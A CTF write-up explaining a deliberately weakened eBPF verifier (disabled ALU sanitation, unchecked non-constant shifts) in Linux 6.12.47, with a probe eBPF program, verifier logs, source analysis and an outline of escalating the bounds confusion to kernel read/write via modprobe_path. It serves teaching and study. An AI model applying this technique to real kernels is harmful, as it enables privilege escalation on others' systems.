---
layout: page
title: "UofT ctf 2026 eebpf [EN]"
date: 2026-01-29 00:00:00 -0000
---

In this challenge, main topic is about ebpf. It's not new for now days but I personally hadn't tried it before, so I've left my thoughts here.

The kernel version is v6.12.47, and patches have been provided. The first part disables the ALU sanitizer, and the second part removes the `src_is_const` check for shift operations.

```diff
diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 24ae8f33e5d7..e5641845ecc0 100644
--- a/kernel/bpf/verifier.c
+++ b/kernel/bpf/verifier.c
@@ -13030,7 +13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,
 static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,
                                    const struct bpf_insn *insn)
 {
-       return env->bypass_spec_v1 || BPF_SRC(insn->code) == BPF_K;
+       return true;
 }
 
 static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
@@ -14108,7 +14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,
        case BPF_LSH:
        case BPF_RSH:
        case BPF_ARSH:
-               return (src_is_const && src_reg->umax_value < insn_bitness);
+               return (src_reg->umax_value < insn_bitness);
        default:
                return false;
        }
```
First, let's look at what each of them means.

Much of the information was taken from the ebpf chapter of [pawnyable](https://pawnyable.cafe/linux-kernel/LK06/ebpf.html), with more general knowledge gathered from ChatGPT and various writeups.

## ALU sanitization

ebpf has a function that verifies and compiles input code. Several flaws in this verification have been found in the past, and the results have had a significant impact because they all lead to reads and writes within the kernel. ALU sanitization is a mechanism that assumes that there is a bug in this verification function and mitigates its impact. 

When exploiting a verification flaw, an attacker uses a "value that is assumed to be 0 but is actually different" to forge the pointer value and read/write it. On the other hand, in theory, once the variable is assumed to be 0, it is fine to continue processing, but it should also work if you actually enter 0 without making the assumption. In this way, ALU sanitization replaces the instruction with an immediate value at some point when the variable is determined to be a constant.

This means that even if an attacker exploits this type of flaw, the value will be fixed as an immediate when it's determined in verification, making it very hard for the attacker to successfully use the shift to create a value.

## src_is_const

I checked the source code [here](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14092). When performing a shift operation such as `r0<<r1`, if the value of `r1` is fixed, `src_is_const` becomes true.

# Grab primitive

Looking at the patch and basic knowledge, there is one key point: it allows shift operations to be performed using values ​​that are not uniquely determined.

However, after thinking about it for a while, it doesn't seem like there's any particularly good way to exploit it, so I'll try performing some calculations that would make this possible and see what happens. Below is the ebpf program and what it does at each point.

- [1] The variables are retrieved from the map structure created before executing the filter. By retrieving them from outside the ebpf program, the values ​​become undefined and need to be estimated.
- [2] By performing an AND operation here, the value captured in [1] changes from an indeterminate value to a value in the range of 0 to 7. If the result here differs between the estimated value and the actual value, it indicates that an attack is possible.
- [3] The shifted result is put back into a map structure, so that the operation result can be checked through the map.


```c
  int mapfd = map_create(8, 0x10);
  val = 0x1337;
  map_update(mapfd, 0, &val);

  struct bpf_insn insns[] = {
    ////////////////////////////////////////////////////////////////
    /* [1] map_lookup_elem(mapfd, 0) */
    // key = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),
    // arg1: mapfd
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    // arg2: key pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    // map_lookup_elem(mapfd, &k)
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    // jmp if success (R0 != NULL)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(), // exit on failure

    ////////////////////////////////////////////////////////////////
    /* [2] value = 1 >> (value[0] & 7) */
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),  // R6 = value[0]
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),           // R7 = &value[0]

    BPF_MOV64_IMM(BPF_REG_1, 0x1),                 // R1 = 1
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),           // R2 = value[0]
    BPF_ALU64_IMM(BPF_AND, BPF_REG_2, 0b0111),     // R2 &= 0b0111 --> shift range[0:7]
    BPF_ALU64_REG(BPF_RSH, BPF_REG_1, BPF_REG_2),  // R1 >>= R2
   
    ////////////////////////////////////////////////////////////////
    /* [3] map_update_elem(mapfd, 0, value) */
    BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),      // key = 0
    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, -0x10), // value = R1

    // arg1: mapfd
    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
    // arg2: key pointer
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
    // arg3: value pointer
    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_2),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -8),
    // arg4: flags
    BPF_MOV64_IMM(BPF_REG_ARG4, 0),
    // map_update_elem(mapfd, &k, &v)
    BPF_EMIT_CALL(BPF_FUNC_map_update_elem), 

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };
```

The output shown below shows that `r1=1` on line 10 is shifted by the register with a range of `0-7` entered on line 13, and as a result, `R1_w=P1` remains unchanged. The actual result should be `(0x0; 0x1)`, but this verification shows that the shift operation has been ignored. The output `val = 0` also shows that the shift operation has actually been performed.

```
$ /exp
func#0 @0
0: R1=ctx() R10=fp0
0: (7a) *(u64 *)(r10 -8) = 0          ; R10=fp0 fp-8_w=00000000
1: (18) r1 = 0x0                      ; R1_w=map_ptr(ks=4,vs=8)
3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0
4: (07) r2 += -8                      ; R2_w=fp-8
5: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,ks=4,vs=8)
6: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0
7: (95) exit

from 6 to 8: R0=map_value(ks=4,vs=8) R10=fp0 fp-8=0000mmmm
8: R0=map_value(ks=4,vs=8) R10=fp0 fp-8=0000mmmm
8: (79) r6 = *(u64 *)(r0 +0)          ; R0=map_value(ks=4,vs=8) R6_w=Pscalar()
9: (bf) r7 = r0                       ; R0=map_value(ks=4,vs=8) R7_w=map_value(ks=4,vs=8)
10: (b7) r1 = 1                       ; R1_w=P1
11: (bf) r2 = r6                      ; R2_w=Pscalar(id=2) R6_w=Pscalar(id=2)
12: (57) r2 &= 7                      ; R2_w=Pscalar(smin=smin32=0,smax=umax=smax32=umax32=7,var_off=(0x0; 0x7))
13: (7f) r1 >>= r2                    ; R1_w=P1 R2_w=Pscalar(smin=smin32=0,smax=umax=smax32=umax32=7,var_off=(0x0; 0x7))
14: (7a) *(u64 *)(r10 -8) = 0         ; R10=fp0 fp-8_w=00000000
15: (7b) *(u64 *)(r10 -16) = r1       ; R1_w=P1 R10=fp0 fp-16_w=mmmmmmmm
16: (18) r1 = 0x0                     ; R1_w=map_ptr(ks=4,vs=8)
18: (bf) r2 = r10                     ; R2_w=fp0 R10=fp0
19: (07) r2 += -8                     ; R2_w=fp-8
20: (bf) r3 = r2                      ; R2_w=fp-8 R3_w=fp-8
21: (07) r3 += -8                     ; R3_w=fp-16
22: (b7) r4 = 0                       ; R4_w=P0
23: (85) call bpf_map_update_elem#2   ; R0_w=Pscalar()
24: (b7) r0 = 0                       ; R0_w=P0
25: (95) exit
processed 24 insns (limit 1000000) max_states_per_insn 0 total_states 1 peak_states 1 mark_read 1

val = 0
```

So what happened? Let's look at the code and assume that a non-constant value is being entered. For example, consider shifting a constant `1` by a value in the range `(0x0; 0x3)`.

The RSH instruction is shown in the code below. First, it calculates the dst side using the src side's `umin_value`, then updates the estimated width using two operations: minimum value of the dst side >>= maximum value of the src side, and maximum value of the dst side >>= minimum value of the src side.

For `tnum_shift`, it uses the macro `TNUM` to represent the actual value and the determined bits.

```c
static void scalar_min_max_rsh(struct bpf_reg_state *dst_reg,
			       struct bpf_reg_state *src_reg)
{
	u64 umax_val = src_reg->umax_value;
	u64 umin_val = src_reg->umin_value;

	/* BPF_RSH is an unsigned shift.  If the value in dst_reg might
	 * be negative, then either:
	 * 1) src_reg might be zero, so the sign bit of the result is
	 *    unknown, so we lose our signed bounds
	 * 2) it's known negative, thus the unsigned bounds capture the
	 *    signed bounds
	 * 3) the signed bounds cross zero, so they tell us nothing
	 *    about the result
	 * If the value in dst_reg is known nonnegative, then again the
	 * unsigned bounds capture the signed bounds.
	 * Thus, in all cases it suffices to blow away our signed bounds
	 * and rely on inferring new ones from the unsigned bounds and
	 * var_off of the result.
	 */
	dst_reg->smin_value = S64_MIN;
	dst_reg->smax_value = S64_MAX;
	dst_reg->var_off = tnum_rshift(dst_reg->var_off, umin_val);
	dst_reg->umin_value >>= umax_val;
	dst_reg->umax_value >>= umin_val;

	/* Its not easy to operate on alu32 bounds here because it depends
	 * on bits being shifted in. Take easy way out and mark unbounded
	 * so we can recalculate later from tnum.
	 */
	__mark_reg32_unbounded(dst_reg);
	__update_reg_bounds(dst_reg);
}

struct tnum tnum_rshift(struct tnum a, u8 shift)
{
	return TNUM(a.value >> shift, a.mask >> shift);
}

#define TNUM(_v, _m)	(struct tnum){.value = _v, .mask = _m}
```

In this example, the value is updated to `1` when `1 >> 0`, and the estimated range is updated to `(0; 1)` when `(1 >> 3; 1 >> 0)`. So far so good.

The problem is the last line, `__update_reg_bounds`, where the upper and lower bounds are updated based on the calculated value and the mask, but since there is no mask, they match, meaning that no range calculation was actually performed.

```c
static void __update_reg64_bounds(struct bpf_reg_state *reg)
{
	/* min signed is max(sign bit) | min(other bits) */
	reg->smin_value = max_t(s64, reg->smin_value,
				reg->var_off.value | (reg->var_off.mask & S64_MIN));
	/* max signed is min(sign bit) | max(other bits) */
	reg->smax_value = min_t(s64, reg->smax_value,
				reg->var_off.value | (reg->var_off.mask & S64_MAX));
	reg->umin_value = max(reg->umin_value, reg->var_off.value);
	reg->umax_value = min(reg->umax_value,
			      reg->var_off.value | reg->var_off.mask);
}

static void __update_reg_bounds(struct bpf_reg_state *reg)
{
	__update_reg32_bounds(reg);
	__update_reg64_bounds(reg);
}
```

The actual update values ​​are: `reg->umin_value = max(reg->umin_value, reg->var_off.value);`: the lower limit is max(0, 1), which is 1; `reg->umax_value = min(reg->umax_value, reg->var_off.value | reg->var_off.mask);`: the upper limit is min(1, 1), which is 1.

As a result, the estimated value becomes 1, resulting in a difference between the actual value and the estimated value.

If you want to support shifting by estimated values ​​in RSH calculations, you will need to perform calculations using both the upper and lower limits and then set a mask.

# AAR/W

In ebpf, pointer access must be performed through a pointer type variable. ADD and SUB can be used for pointer type operations, but the range is limited to the size of the structure being accessed. However, this restriction is a different story if the value is off. Specifically, by multiplying a value that is verified as 0, it is possible to create a state where the verification returns 0 but the actual multiplied value remains. By using this, you can add any value to a pointer, and then access the destination as a pointer to read and write it.

For the pointer to read from, the heap address is obtained from a nearby pointer pointing to itself, the kernel base address is obtained from the map's ops table, the offset to `modprobepath` is calculated, added to the pointer, and then written.

The final exploit is [here](https://github.com/jt00000/ctf.writeup/blob/master/uoft2026/eebpf/exp.c).
